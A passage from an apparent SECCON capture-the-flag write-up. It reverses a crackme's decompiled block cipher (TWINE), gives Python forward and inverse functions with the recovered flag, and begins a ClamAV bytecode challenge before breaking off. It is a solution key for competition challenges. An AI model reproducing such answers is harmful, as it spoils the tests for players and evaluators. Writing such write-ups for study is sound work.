+  unsigned __int64 v56; // [rsp+88h] [rbp-48h]
+
+  v56 = __readfsqword(0x28u);
+  si128 = _mm_load_si128((const __m128i *)&xmmword_3100);
+  strcpy(flaginfo->wrong_msg, "Vsnof///");
+  *(__m128i *)&flaginfo->tmp[16] = si128;
+  v25 = _mm_load_si128((const __m128i *)&xmmword_3110);
+  flaginfo->cur = 0LL;
+  *(__m128i *)flaginfo->tmp = v25;
+  v26 = _mm_load_si128((const __m128i *)&xmmword_3120);
+  strcpy(flaginfo->correct_msg, "Bnssdbu ");
+  *(__m128i *)&flaginfo->tmp[48] = v26;
+  v27 = _mm_load_si128((const __m128i *)&xmmword_3130);
+  *(_DWORD *)&flaginfo->tmp[80] = 0xB241209;
+  *(__m128i *)&flaginfo->tmp[64] = v27;
+  v55[0].m128i_i32[1] = flaginfo->tmp[16] & 0xF;
+  v55[0].m128i_i32[0] = (unsigned __int8)flaginfo->tmp[16] >> 4;
+  v55[0].m128i_i32[3] = flaginfo->tmp[17] & 0xF;
+  v55[0].m128i_i32[2] = (unsigned __int8)flaginfo->tmp[17] >> 4;
+  v2 = (unsigned __int8)flaginfo->tmp[18] >> 4;
+  v55[1].m128i_i32[1] = flaginfo->tmp[18] & 0xF;
+  v55[1].m128i_i32[0] = v2;
+  v3 = (unsigned __int8)flaginfo->tmp[19] >> 4;
+  v55[1].m128i_i32[3] = flaginfo->tmp[19] & 0xF;
+  v55[1].m128i_i32[2] = v3;
+  v4 = (unsigned __int8)flaginfo->tmp[20] >> 4;
+  v55[2].m128i_i32[1] = flaginfo->tmp[20] & 0xF;
+  v55[2].m128i_i32[0] = v4;
+  v5 = (unsigned __int8)flaginfo->tmp[21] >> 4;
+  v55[2].m128i_i32[3] = flaginfo->tmp[21] & 0xF;
+  v55[2].m128i_i32[2] = v5;
+  v6 = (unsigned __int8)flaginfo->tmp[22] >> 4;
+  v55[3].m128i_i32[1] = flaginfo->tmp[22] & 0xF;
+  v55[3].m128i_i32[0] = v6;
+  v7 = (unsigned __int8)flaginfo->tmp[23] >> 4;
+  v55[3].m128i_i32[3] = flaginfo->tmp[23] & 0xF;
+  v55[3].m128i_i32[2] = v7;
+  v8 = (unsigned __int8)flaginfo->tmp[24] >> 4;
+  v55[4].m128i_i32[1] = flaginfo->tmp[24] & 0xF;
+  v55[4].m128i_i32[0] = v8;
+  v9 = (unsigned __int8)flaginfo->tmp[25] >> 4;
+  v55[4].m128i_i32[3] = flaginfo->tmp[25] & 0xF;
+  v55[4].m128i_i32[2] = v9;
+  v10 = (unsigned __int8)flaginfo->tmp[26] >> 4;
+  v55[5].m128i_i32[1] = flaginfo->tmp[26] & 0xF;
+  v55[5].m128i_i32[0] = v10;
+  v11 = (unsigned __int8)flaginfo->tmp[27] >> 4;
+  v55[5].m128i_i32[3] = flaginfo->tmp[27] & 0xF;
+  v55[5].m128i_i32[2] = v11;
+  v12 = (unsigned __int8)flaginfo->tmp[28] >> 4;
+  v55[6].m128i_i32[1] = flaginfo->tmp[28] & 0xF;
+  v55[6].m128i_i32[0] = v12;
+  v13 = (unsigned __int8)flaginfo->tmp[29] >> 4;
+  v55[6].m128i_i32[3] = flaginfo->tmp[29] & 0xF;
+  v55[6].m128i_i32[2] = v13;
+  v14 = (unsigned __int8)flaginfo->tmp[30] >> 4;
+  v55[7].m128i_i32[1] = flaginfo->tmp[30] & 0xF;
+  v55[7].m128i_i32[0] = v14;
+  v15 = (unsigned __int8)flaginfo->tmp[31] >> 4;
+  v55[7].m128i_i32[3] = flaginfo->tmp[31] & 0xF;
+  v55[7].m128i_i32[2] = v15;
+  v16 = &flaginfo->tmp[84];
+  v17 = &flaginfo->tmp[48];
+  v18 = &flaginfo->tmp[364];
+  do
+  {
+  *v16 = v55[7].m128i_i8[12];
+  v16[1] = v55[7].m128i_i8[0];
+  v16[2] = v55[4].m128i_i8[8];
+  v16[3] = v55[4].m128i_i8[4];
+  v16[4] = v55[3].m128i_i8[12];
+  v16[5] = v55[3].m128i_i8[0];
+  v16[6] = v55[0].m128i_i8[12];
+  v16[7] = v55[0].m128i_i8[8];
+  v55[0].m128i_i32[1] ^= (unsigned __int8)flaginfo->tmp[v55[7].m128i_i32[2]];
+  v55[1].m128i_i32[0] ^= (unsigned __int8)flaginfo->tmp[v55[4].m128i_i32[0]];
+  v55[5].m128i_i32[3] ^= (unsigned __int8)flaginfo->tmp[v55[0].m128i_i32[0]];
+  v19 = *v17 & 7;
+  v55[4].m128i_i32[3] ^= (unsigned __int8)*v17 >> 3;
+  v55[1].m128i_i32[3] ^= v19;
+  v20 = v55[0].m128i_i32[0];
+  v21 = _mm_cvtsi32_si128(v55[0].m128i_u32[1]);
+  v22 = v55[0].m128i_u32[2];
+  v23 = _mm_cvtsi32_si128(v55[0].m128i_u32[3]);
+  v55[0] = _mm_load_si128(&v55[1]);
+  v55[1] = _mm_load_si128(&v55[2]);
+  v55[2] = _mm_load_si128(&v55[3]);
+  v55[3] = _mm_load_si128(&v55[4]);
+  v55[4] = _mm_load_si128(&v55[5]);
+  v55[5] = _mm_load_si128(&v55[6]);
+  v55[6] = _mm_load_si128(&v55[7]);
+  v55[7] = _mm_unpacklo_epi64(
+             _mm_unpacklo_epi32(v21, _mm_cvtsi32_si128(v22)),
+             _mm_unpacklo_epi32(v23, _mm_cvtsi32_si128(v20)));
+  v16 += 8;
+  ++v17;
+  }
+  while ( v16 != v18 );
+  flaginfo->tmp[364] = v55[0].m128i_i8[12];
+  flaginfo->tmp[365] = v55[0].m128i_i8[8];
+  flaginfo->tmp[366] = v55[3].m128i_i8[12];
+  flaginfo->tmp[367] = v55[3].m128i_i8[0];
+  flaginfo->tmp[368] = v55[4].m128i_i8[8];
+  flaginfo->tmp[369] = v55[4].m128i_i8[4];
+  flaginfo->tmp[370] = v55[7].m128i_i8[12];
+  flaginfo->tmp[371] = v55[7].m128i_i8[0];
+  while ( 1 )
+  {
+  block = &flaginfo->dat[flaginfo->cur];
+  LOBYTE(v29) = *block >> 4;
+  HIBYTE(v29) = *block & 0xF;
+  v30 = ((unsigned __int64)(block[3] & 0xF) << 56) | ((unsigned __int64)(block[3] >> 4) << 48) & 0xFFFFFFFFFFFFFFLL | ((unsigned __int64)(block[2] & 0xF) << 40) & 0xFFFFFFFFFFFFLL | ((unsigned __int64)(block[2] >> 4) << 32) & 0xFFFFFFFFFFLL | ((unsigned __int8)(block[1] & 0xF) << 24) | ((unsigned __int64)(block[1] >> 4) << 16) & 0xFFFFFF | v29;
+  v31 = block[4];
+  LOBYTE(v32) = v31 >> 4;
+  HIBYTE(v32) = v31 & 0xF;
+  v33 = ((unsigned __int64)(block[7] & 0xF) << 56) | ((unsigned __int64)(block[7] >> 4) << 48) & 0xFFFFFFFFFFFFFFLL | ((unsigned __int64)(block[6] & 0xF) << 40) & 0xFFFFFFFFFFFFLL | ((unsigned __int64)(block[6] >> 4) << 32) & 0xFFFFFFFFFFLL | ((unsigned __int8)(block[5] & 0xF) << 24) | ((unsigned __int64)(block[5] >> 4) << 16) & 0xFFFFFF | v32;
+  cblock = &flaginfo->tmp[84];
+  do
+  {
+    BYTE1(v30) ^= flaginfo->tmp[(unsigned __int8)(v30 ^ *cblock)];
+    v35 = ((unsigned __int64)(unsigned __int8)(flaginfo->tmp[(unsigned __int8)(cblock[1] ^ BYTE2(v30))] ^ BYTE3(v30)) << 24) | v30 & 0xFFFFFFFF00FFFFFFLL;
+    v36 = ((unsigned __int64)(unsigned __int8)(flaginfo->tmp[(unsigned __int8)(cblock[2] ^ BYTE4(v35))] ^ BYTE5(v35)) << 40) | v35 & 0xFFFF00FFFFFFFFFFLL;
+    BYTE1(v33) ^= flaginfo->tmp[(unsigned __int8)(v33 ^ cblock[4])];
+    v38 = ((unsigned __int64)(unsigned __int8)(flaginfo->tmp[(unsigned __int8)(cblock[5] ^ BYTE2(v33))] ^ BYTE3(v33)) << 24) | v33 & 0xFFFFFFFF00FFFFFFLL;
+    v39 = ((unsigned __int64)(unsigned __int8)(flaginfo->tmp[(unsigned __int8)(cblock[6] ^ BYTE4(v38))] ^ BYTE5(v38)) << 40) | v38 & 0xFFFF00FFFFFFFFFFLL;
+    v40 = v39 & 0xFFFFFFFFFFFFFFLL | ((unsigned __int64)(unsigned __int8)(flaginfo->tmp[(unsigned __int8)(cblock[7] ^ BYTE6(v39))] ^ HIBYTE(v39)) << 56);
+    v41 = (unsigned __int64)(unsigned __int8)v36 << 40;
+    LOWORD(v41) = (unsigned int)v36 >> 8;
+    v37 = ((unsigned __int64)(unsigned __int8)(flaginfo->tmp[(unsigned __int8)(cblock[3] ^ BYTE6(v36))] ^ HIBYTE(v36)) << 56) | v36 & 0xFFFFFFFFFFFFFFLL;
+    v42 = ((unsigned __int64)BYTE3(v37) << 32) | v41 & 0xFFFFFF00FFFFFFFFLL | (HIDWORD(v37) << 56);
+    v43 = (unsigned __int64)BYTE5(v37) << 32;
+    LOBYTE(v43) = HIBYTE(v37);
+    v44 = ((unsigned __int64)(unsigned __int8)v40 << 40) | v43 & 0xFFFF00FFFFFFFFFFLL;
+    BYTE1(v44) = BYTE2(v40);
+    v30 = ((unsigned __int64)BYTE1(v40) << 48) | (v37 >> 24) & 0xFF000000 | v42 | (v40 >> 8) & 0xFF0000;
+    v33 = (v40 >> 24) & 0xFFFF0000 | (HIDWORD(v40) << 56) | v44 & 0xFFFF0000FFFFLL | (HIBYTE(v40) << 48);
+    cblock += 8;
+  }
+  while ( cblock != &flaginfo->tmp[364] );
+  BYTE1(v30) ^= flaginfo->tmp[(unsigned __int8)(v30 ^ flaginfo->tmp[364])];
+  v45 = v30 & 0xFFFFFFFF00FFFFFFLL | ((unsigned __int64)(unsigned __int8)(flaginfo->tmp[(unsigned __int8)(flaginfo->tmp[365] ^ BYTE2(v30))] ^ BYTE3(v30)) << 24);
+  v46 = ((unsigned __int64)(unsigned __int8)(flaginfo->tmp[(unsigned __int8)(flaginfo->tmp[366] ^ BYTE4(v45))] ^ BYTE5(v45)) << 40) | v45 & 0xFFFF00FFFFFFFFFFLL;
+  v47 = v46 & 0xFFFFFFFFFFFFFFLL | ((unsigned __int64)(unsigned __int8)(flaginfo->tmp[(unsigned __int8)(flaginfo->tmp[367] ^ BYTE6(v46))] ^ HIBYTE(v46)) << 56);
+  BYTE1(v33) ^= flaginfo->tmp[(unsigned __int8)(v33 ^ flaginfo->tmp[368])];
+  v48 = v33 & 0xFFFFFFFF00FFFFFFLL | ((unsigned __int64)(unsigned __int8)(flaginfo->tmp[(unsigned __int8)(flaginfo->tmp[369] ^ BYTE2(v33))] ^ BYTE3(v33)) << 24);
+  v49 = ((unsigned __int64)(unsigned __int8)(flaginfo->tmp[(unsigned __int8)(flaginfo->tmp[370] ^ BYTE4(v48))] ^ BYTE5(v48)) << 40) | v48 & 0xFFFF00FFFFFFFFFFLL;
+  v50 = ((unsigned __int64)(unsigned __int8)(flaginfo->tmp[(unsigned __int8)(flaginfo->tmp[371] ^ BYTE6(v49))] ^ HIBYTE(v49)) << 56) | v49 & 0xFFFFFFFFFFFFFFLL;
+  *block = BYTE1(v47) | (16 * v47);
+  block[1] = BYTE3(v47) | (16 * BYTE2(v47));
+  block[2] = BYTE5(v47) | (16 * BYTE4(v47));
+  block[3] = (16 * BYTE6(v47)) | HIBYTE(v47);
+  block[4] = BYTE1(v50) | (16 * v50);
+  block[5] = BYTE3(v50) | (16 * BYTE2(v50));
+  block[6] = BYTE5(v50) | (16 * BYTE4(v50));
+  block[7] = (16 * BYTE6(v50)) | HIBYTE(v50);
+  switch ( MEMORY[0x10000000000000F] )
+  {
+    case 0LL:
+      v51 = 0x5894A5AF7F7693B7LL;
+      goto LABEL_8;
+    case 8LL:
+      JUMPOUT(0x1EDFLL);
+    case 0x10LL:
+      v51 = 0x98BA6F1FF3CC98LL;
+      goto LABEL_8;
+    case 0x18LL:
+      v51 = 0xAE6575961AF354CLL;
+      goto LABEL_8;
+    case 0x20LL:
+      v51 = 0xD853F981DF45AB41LL;
+      goto LABEL_8;
+    case 0x28LL:
+      v51 = 0xE1FEFD554E662F7FLL;
+      goto LABEL_8;
+    case 0x30LL:
+      v51 = 0x3CA11FB09E498AB4LL;
+  LABEL_8:
+      if ( v51 != *(_QWORD *)(MEMORY[0xFFFFFFFFFFFFFF] + MEMORY[0x10000000000000F]) )
+        goto LABEL_11;
+      v52 = MEMORY[0x10000000000000F] + 8LL;
+      flaginfo->cur = MEMORY[0x10000000000000F] + 8LL;
+      if ( v52 >= flaginfo->len )
+      {
+        if ( v52 == 0x38 )
+        {
+          MEMORY[0x100000000000020] ^= 0x101010101010101uLL;
+          v53 = 0x100000000000020LL;
+          puts((const char *)0x100000000000020LL);
+        }
+        else
+        {
+  LABEL_11:
+          MEMORY[0x100000000000017] ^= 0x101010101010101uLL;
+          v53 = 0x100000000000017LL;
+          puts((const char *)0x100000000000017LL);
+        }
+        free(*(void **)v53);
+        free(flaginfo);
+        exit(0);
+      }
+      return result;
+    default:
+      goto LABEL_11;
+  }
+  }
+  }
+  ```
+
+We defined `struct flaginfo` as follows:
+
+``` c
+00000000 flaginfo        struc ; (sizeof=0x1A0, mappedto_60)
+00000000 dat             dq ?                    ; offset
+00000008 len             dq ?
+00000010 cur             dq ?
+00000018 wrong_msg       db 9 dup(?)
+00000021 correct_msg     db 9 dup(?)
+0000002A tmp             db 374 dup(?)
+000001A0 flaginfo        ends
+```
+
+The flag bytes get split into nibbles, that are then xored with the results from a lookup table containing the values `0x0c, 0x00, 0x0f, 0x0a, 0x02, 0x0b, 0x09, 0x05, 0x08, 0x03, 0x0d, 0x07, 0x01, 0x0e, 0x06, 0x04`. It was clear that we were looking at some kind of block cipher, but we unfortunately didn’t recognize which one it was and had to spend quite some time re-writing the bit-fiddling as a python function:
+
+``` python
+#!/usr/bin/env python3
+
+def forward(flag):
+
+    assert len(flag) % 8 == 0
+
+    cs = [
+        0x05, 0x09, 0x09, 0x08, 0x01, 0x00, 0x05, 0x04,
+        0x01, 0x01, 0x05, 0x04, 0x04, 0x08, 0x08, 0x01,
+        0x09, 0x0f, 0x01, 0x08, 0x01, 0x06, 0x03, 0x08,
+        0x08, 0x01, 0x01, 0x03, 0x03, 0x02, 0x05, 0x03,
+        0x0f, 0x03, 0x05, 0x04, 0x0c, 0x09, 0x04, 0x09,
+        0x0b, 0x03, 0x08, 0x01, 0x07, 0x01, 0x01, 0x05,
+        0x06, 0x06, 0x03, 0x08, 0x0a, 0x0f, 0x03, 0x01,
+        0x06, 0x08, 0x05, 0x03, 0x01, 0x01, 0x0f, 0x01,
+        0x09, 0x09, 0x04, 0x09, 0x06, 0x03, 0x01, 0x05,
+        0x0b, 0x00, 0x01, 0x05, 0x09, 0x03, 0x0e, 0x08,
+        0x05, 0x01, 0x03, 0x01, 0x02, 0x06, 0x01, 0x03,
+        0x08, 0x0e, 0x0f, 0x01, 0x0b, 0x08, 0x06, 0x05,
+        0x0b, 0x03, 0x01, 0x05, 0x05, 0x09, 0x0a, 0x04,
+        0x00, 0x00, 0x0e, 0x08, 0x0c, 0x00, 0x07, 0x01,
+        0x0a, 0x08, 0x01, 0x03, 0x08, 0x01, 0x09, 0x03,
+        0x08, 0x04, 0x06, 0x05, 0x07, 0x0e, 0x01, 0x0f,
+        0x0f, 0x02, 0x0a, 0x04, 0x06, 0x03, 0x0c, 0x01,
+        0x0a, 0x05, 0x07, 0x01, 0x06, 0x00, 0x0b, 0x0e,
+        0x0d, 0x09, 0x09, 0x03, 0x03, 0x08, 0x01, 0x01,
+        0x06, 0x04, 0x01, 0x0f, 0x07, 0x04, 0x01, 0x06,
+        0x01, 0x05, 0x0c, 0x01, 0x05, 0x02, 0x00, 0x0a,
+        0x0f, 0x04, 0x0b, 0x0e, 0x0d, 0x05, 0x07, 0x07,
+        0x03, 0x0d, 0x01, 0x01, 0x0e, 0x09, 0x04, 0x09,
+        0x07, 0x06, 0x01, 0x06, 0x0a, 0x04, 0x00, 0x01,
+        0x00, 0x0d, 0x00, 0x0a, 0x01, 0x05, 0x0c, 0x0c,
+        0x0e, 0x0d, 0x07, 0x07, 0x01, 0x04, 0x0f, 0x0b,
+        0x0b, 0x0f, 0x04, 0x09, 0x01, 0x0d, 0x08, 0x01,
+        0x0a, 0x05, 0x00, 0x01, 0x00, 0x06, 0x06, 0x01,
+        0x0c, 0x0e, 0x0c, 0x0c, 0x0c, 0x0d, 0x07, 0x00,
+        0x0a, 0x03, 0x0f, 0x0b, 0x0c, 0x0d, 0x05, 0x07,
+        0x03, 0x02, 0x08, 0x01, 0x01, 0x0f, 0x00, 0x04,
+        0x02, 0x02, 0x06, 0x01, 0x06, 0x05, 0x0f, 0x00,
+        0x06, 0x0d, 0x07, 0x00, 0x07, 0x0e, 0x09, 0x0c,
+        0x0b, 0x08, 0x05, 0x07, 0x02, 0x03, 0x00, 0x0f,
+        0x05, 0x08, 0x00, 0x04, 0x06, 0x02, 0x04, 0x08,
+    ]
+
+    TMP = [
+        0x0c, 0x00, 0x0f, 0x0a, 0x02, 0x0b, 0x09, 0x05,
+        0x08, 0x03, 0x0d, 0x07, 0x01, 0x0e, 0x06, 0x04,
+    ]
+
+    PERM = [1, 2, 11, 6, 3, 0, 9, 4, 7, 10, 13, 14, 5, 8, 15, 12]
+
+    FINAL = [
+        0x03, 0x06, 0x0d, 0x02, 0x0f, 0x00, 0x0a, 0x0d,
+    ]
+
+    explode = lambda bs: [ (bs[z//2] >> (4 * ((z + 1) & 1)) & 0xf) for z in range(len(bs)*2) ]
+    combine = lambda ns: [ (ns[2*z] << 4) | ns[2*z+1] for z in range(0, len(ns)//2) ]
+
+    flag = bytearray(flag)
+
+
+    for j in range(0, len(flag), 8):
+        block = explode(flag[j:j+8])
+        for i in range(0, len(cs), 8):
+            cblock = cs[i:i+8]
+
+            block[ 1] ^= TMP[cblock[0] ^ block[ 0]]
+            block[ 3] ^= TMP[cblock[1] ^ block[ 2]]
+            block[ 5] ^= TMP[cblock[2] ^ block[ 4]]
+            block[ 7] ^= TMP[cblock[3] ^ block[ 6]]
+
+            block[ 9] ^= TMP[cblock[4] ^ block[ 8]]
+            block[11] ^= TMP[cblock[5] ^ block[10]]
+            block[13] ^= TMP[cblock[6] ^ block[12]]
+            block[15] ^= TMP[cblock[7] ^ block[14]]
+
+            block = [ block[PERM[i]] for i in range(len(block)) ]
+
+
+        block[ 1] ^= TMP[FINAL[0] ^ block[ 0]]
+        block[ 3] ^= TMP[FINAL[1] ^ block[ 2]]
+        block[ 5] ^= TMP[FINAL[2] ^ block[ 4]]
+        block[ 7] ^= TMP[FINAL[3] ^ block[ 6]]
+
+        block[ 9] ^= TMP[FINAL[4] ^ block[ 8]]
+        block[11] ^= TMP[FINAL[5] ^ block[10]]
+        block[13] ^= TMP[FINAL[6] ^ block[12]]
+        block[15] ^= TMP[FINAL[7] ^ block[14]]
+
+        flag[j:j+8] = combine(block)
+
+    return bytes(flag)
+
+
+assert forward(b"SECCON{0") == bytes.fromhex("103848a0cf852340") ## health check
+```
+
+Adding a compatible inverse-permutation and re-ordering the xor operations we were able to write an inverse function `backward`, which yielded the flag when passing it the constant 64-bit values from the `heart` function:
+
+``` python
+#!/usr/bin/env python3
+
+cs = [
+    0x05, 0x09, 0x09, 0x08, 0x01, 0x00, 0x05, 0x04,
+    0x01, 0x01, 0x05, 0x04, 0x04, 0x08, 0x08, 0x01,
+    0x09, 0x0f, 0x01, 0x08, 0x01, 0x06, 0x03, 0x08,
+    0x08, 0x01, 0x01, 0x03, 0x03, 0x02, 0x05, 0x03,
+    0x0f, 0x03, 0x05, 0x04, 0x0c, 0x09, 0x04, 0x09,
+    0x0b, 0x03, 0x08, 0x01, 0x07, 0x01, 0x01, 0x05,
+    0x06, 0x06, 0x03, 0x08, 0x0a, 0x0f, 0x03, 0x01,
+    0x06, 0x08, 0x05, 0x03, 0x01, 0x01, 0x0f, 0x01,
+    0x09, 0x09, 0x04, 0x09, 0x06, 0x03, 0x01, 0x05,
+    0x0b, 0x00, 0x01, 0x05, 0x09, 0x03, 0x0e, 0x08,
+    0x05, 0x01, 0x03, 0x01, 0x02, 0x06, 0x01, 0x03,
+    0x08, 0x0e, 0x0f, 0x01, 0x0b, 0x08, 0x06, 0x05,
+    0x0b, 0x03, 0x01, 0x05, 0x05, 0x09, 0x0a, 0x04,
+    0x00, 0x00, 0x0e, 0x08, 0x0c, 0x00, 0x07, 0x01,
+    0x0a, 0x08, 0x01, 0x03, 0x08, 0x01, 0x09, 0x03,
+    0x08, 0x04, 0x06, 0x05, 0x07, 0x0e, 0x01, 0x0f,
+    0x0f, 0x02, 0x0a, 0x04, 0x06, 0x03, 0x0c, 0x01,
+    0x0a, 0x05, 0x07, 0x01, 0x06, 0x00, 0x0b, 0x0e,
+    0x0d, 0x09, 0x09, 0x03, 0x03, 0x08, 0x01, 0x01,
+    0x06, 0x04, 0x01, 0x0f, 0x07, 0x04, 0x01, 0x06,
+    0x01, 0x05, 0x0c, 0x01, 0x05, 0x02, 0x00, 0x0a,
+    0x0f, 0x04, 0x0b, 0x0e, 0x0d, 0x05, 0x07, 0x07,
+    0x03, 0x0d, 0x01, 0x01, 0x0e, 0x09, 0x04, 0x09,
+    0x07, 0x06, 0x01, 0x06, 0x0a, 0x04, 0x00, 0x01,
+    0x00, 0x0d, 0x00, 0x0a, 0x01, 0x05, 0x0c, 0x0c,
+    0x0e, 0x0d, 0x07, 0x07, 0x01, 0x04, 0x0f, 0x0b,
+    0x0b, 0x0f, 0x04, 0x09, 0x01, 0x0d, 0x08, 0x01,
+    0x0a, 0x05, 0x00, 0x01, 0x00, 0x06, 0x06, 0x01,
+    0x0c, 0x0e, 0x0c, 0x0c, 0x0c, 0x0d, 0x07, 0x00,
+    0x0a, 0x03, 0x0f, 0x0b, 0x0c, 0x0d, 0x05, 0x07,
+    0x03, 0x02, 0x08, 0x01, 0x01, 0x0f, 0x00, 0x04,
+    0x02, 0x02, 0x06, 0x01, 0x06, 0x05, 0x0f, 0x00,
+    0x06, 0x0d, 0x07, 0x00, 0x07, 0x0e, 0x09, 0x0c,
+    0x0b, 0x08, 0x05, 0x07, 0x02, 0x03, 0x00, 0x0f,
+    0x05, 0x08, 0x00, 0x04, 0x06, 0x02, 0x04, 0x08,
+]
+
+TMP = [
+    0x0c, 0x00, 0x0f, 0x0a, 0x02, 0x0b, 0x09, 0x05,
+    0x08, 0x03, 0x0d, 0x07, 0x01, 0x0e, 0x06, 0x04,
+]
+#       0  1  2   3  4  5  6  7  8  9   10  11  12 13 14  15
+PERM = [1, 2, 11, 6, 3, 0, 9, 4, 7, 10, 13, 14, 5, 8, 15, 12]
+INV_PERM = [5, 0, 1, 4, 7, 12, 3, 8, 13, 6, 9, 2, 15, 10, 11, 14]
+
+FINAL = [
+    0x03, 0x06, 0x0d, 0x02, 0x0f, 0x00, 0x0a, 0x0d,
+]
+
+explode = lambda bs: [ (bs[z//2] >> (4 * ((z + 1) & 1)) & 0xf) for z in range(len(bs)*2) ]
+combine = lambda ns: [ (ns[2*z] << 4) | ns[2*z+1] for z in range(0, len(ns)//2) ]
+
+def forward(flag):
+
+    global cs, TMP, PERM, FINAL
+
+    assert len(flag) % 8 == 0
+
+    flag = bytearray(flag)
+
+    for j in range(0, len(flag), 8):
+        block = explode(flag[j:j+8])
+        for i in range(0, len(cs), 8):
+            cblock = cs[i:i+8]
+
+            block[ 1] ^= TMP[cblock[0] ^ block[ 0]]
+            block[ 3] ^= TMP[cblock[1] ^ block[ 2]]
+            block[ 5] ^= TMP[cblock[2] ^ block[ 4]]
+            block[ 7] ^= TMP[cblock[3] ^ block[ 6]]
+
+            block[ 9] ^= TMP[cblock[4] ^ block[ 8]]
+            block[11] ^= TMP[cblock[5] ^ block[10]]
+            block[13] ^= TMP[cblock[6] ^ block[12]]
+            block[15] ^= TMP[cblock[7] ^ block[14]]
+
+            block = [ block[PERM[i]] for i in range(len(block)) ]
+
+
+        block[ 1] ^= TMP[FINAL[0] ^ block[ 0]]
+        block[ 3] ^= TMP[FINAL[1] ^ block[ 2]]
+        block[ 5] ^= TMP[FINAL[2] ^ block[ 4]]
+        block[ 7] ^= TMP[FINAL[3] ^ block[ 6]]
+
+        block[ 9] ^= TMP[FINAL[4] ^ block[ 8]]
+        block[11] ^= TMP[FINAL[5] ^ block[10]]
+        block[13] ^= TMP[FINAL[6] ^ block[12]]
+        block[15] ^= TMP[FINAL[7] ^ block[14]]
+
+        flag[j:j+8] = combine(block)
+
+    return bytes(flag)
+
+def backward(flag):
+
+    global cs, TMP, PERM, FINAL
+
+    assert len(flag) % 8 == 0
+
+    flag = bytearray(flag)
+
+    for j in range(0, len(flag), 8):
+        block = explode(flag[j:j+8])
+
+        block[ 1] ^= TMP[FINAL[0] ^ block[ 0]]
+        block[ 3] ^= TMP[FINAL[1] ^ block[ 2]]
+        block[ 5] ^= TMP[FINAL[2] ^ block[ 4]]
+        block[ 7] ^= TMP[FINAL[3] ^ block[ 6]]
+
+        block[ 9] ^= TMP[FINAL[4] ^ block[ 8]]
+        block[11] ^= TMP[FINAL[5] ^ block[10]]
+        block[13] ^= TMP[FINAL[6] ^ block[12]]
+        block[15] ^= TMP[FINAL[7] ^ block[14]]
+
+        for i in range(0, len(cs), 8)[::-1]:
+            block = [ block[INV_PERM[i]] for i in range(len(block)) ]
+
+            cblock = cs[i:i+8]
+
+            block[ 1] ^= TMP[cblock[0] ^ block[ 0]]
+            block[ 3] ^= TMP[cblock[1] ^ block[ 2]]
+            block[ 5] ^= TMP[cblock[2] ^ block[ 4]]
+            block[ 7] ^= TMP[cblock[3] ^ block[ 6]]
+
+            block[ 9] ^= TMP[cblock[4] ^ block[ 8]]
+            block[11] ^= TMP[cblock[5] ^ block[10]]
+            block[13] ^= TMP[cblock[6] ^ block[12]]
+            block[15] ^= TMP[cblock[7] ^ block[14]]
+
+
+        flag[j:j+8] = combine(block)
+
+    return bytes(flag)
+
+assert forward(b"SECCON{0") == bytes.fromhex("103848a0cf852340") ## health check
+assert backward(bytes.fromhex("103848a0cf852340")) == b"SECCON{0"
+
+
+SHOULD = b"".join([ int.to_bytes(x, 8, "little") for x in [
+    0x5894A5AF7F7693B7,
+    0x94706B86CE8E1CCE,
+    0x0098BA6F1FF3CC98,
+    0x0AE6575961AF354C,
+    0xD853F981DF45AB41,
+    0xE1FEFD554E662F7F,
+    0x3CA11FB09E498AB4
+    ]
+])
+
+print(backward(SHOULD))
+```
+
+``` bash
+python3 pwn.py
+b'SECCON{TWINE_wr1tt3n_1n_3xc3pt10n_0r13nt3d_pr0gr4mm1ng}\x01'
+```
+
+We still have to remove the padding, so the flag is `SECCON{TWINE_wr1tt3n_1n_3xc3pt10n_0r13nt3d_pr0gr4mm1ng}`, teaching us that we should have googled harder for the correct cipher: [TWINE](https://www.nec.com/en/global/rd/tg/code/symenc/pdf/twine_LC11.pdf)
+
+### devil hunter
+
+##### bobo1239 \| 31 solves, 168 points
+
+We’re given two files:
+
+- A `check.sh` which calls `clamscan` and then, depending on the return code, prints “Correct!” or “Wrong…”
+- And a `flag.cbc` file which is a ClamAV database which contains a *bytecode signature*. ClamAV implements a custom VM which can be used to detect more complex malware signatures.
+
+Given this we have to create a file with the correct flag so it gets detected by the ClamAV. Since ClamAV is open-source we check out a copy of the code and built a custom version. We’ve first try to get an execution trace using `clambc` (bytecode testing tool) but for some reason (probably user error) it crashes. We could also try to get a JITed version of code to just analyze x86 code but we were too lazy to setup the correct LLVM version. So instead we just dump out the IR using:
+
+    ./clambc/clambc -c ../../flag.cbc
+
+We see that the bytecode defines three functions:
+
+- `F.0` is just a main functions and immediately calls `F.1`.
+
+- `F.1` is rather long but we can see some interesting things:
+
+  ``` c
+  ########################################################################
+  ####################### Function id   1 ################################
+  ########################################################################
+  found a total of 4 globals
+  GID  ID    VALUE
+  ------------------------------------------------------------------------
+      0 [  0]: i0 unknown
+      1 [  1]: [22 x i8] unknown
+      2 [  2]: i8* unknown
+      3 [  3]: i8* unknown
+  ------------------------------------------------------------------------
+  found 104 values with 0 arguments and 104 locals
+  VID  ID    VALUE
+  ------------------------------------------------------------------------
+  ...
+  ------------------------------------------------------------------------
+  found a total of 72 constants
+  CID  ID    VALUE
+  ------------------------------------------------------------------------
+      2 [106]: 7(0x7)
+      3 [107]: 0(0x0)
+      ...
+      31 [135]: 1939767458(0x739e80a2)
+      ...
+      36 [140]: 984514723(0x3aae80a3)
+      ...
+      41 [145]: 1000662943(0x3ba4e79f)
+      ...
+      46 [150]: 2025505267(0x78bac1f3)
+      ...
+      51 [155]: 1593426419(0x5ef9c1f3)
+      ...
+      56 [160]: 1002040479(0x3bb9ec9f)
+      ...
+      61 [165]: 1434878964(0x558683f4)
+      ...
+      66 [170]: 1442502036(0x55fad594)
+      ...
+      71 [175]: 1824513439(0x6cbfdd9f)
+  ------------------------------------------------------------------------
+  found a total of 176 total values
+  ------------------------------------------------------------------------
+  FUNCTION ID: F.1 -> NUMINSTS 115
+  BB   IDX  OPCODE              [ID /IID/MOD]  INST
+  ------------------------------------------------------------------------
+      0    0  OP_BC_GEPZ          [36 /184/  4]  5 = gepz p.4 + (104)
+      0    1  OP_BC_GEPZ          [36 /184/  4]  7 = gepz p.6 + (105)
+      0    2  OP_BC_CALL_API      [33 /168/  3]  8 = seek[3] (106, 107)
+      ...
+      3   19  OP_BC_CALL_API      [33 /168/  3]  19 = read[1] (p.3, 117)
+      ...
+      4   26  OP_BC_CALL_API      [33 /168/  3]  24 = read[1] (p.3, 121)
+      ...
+      5   38  OP_BC_CALL_DIRECT   [32 /163/  3]  33 = call F.2 (32)
+      ...
+      6   52  OP_BC_ICMP_EQ       [21 /108/  3]  44 = (43 == 135)
+      ...
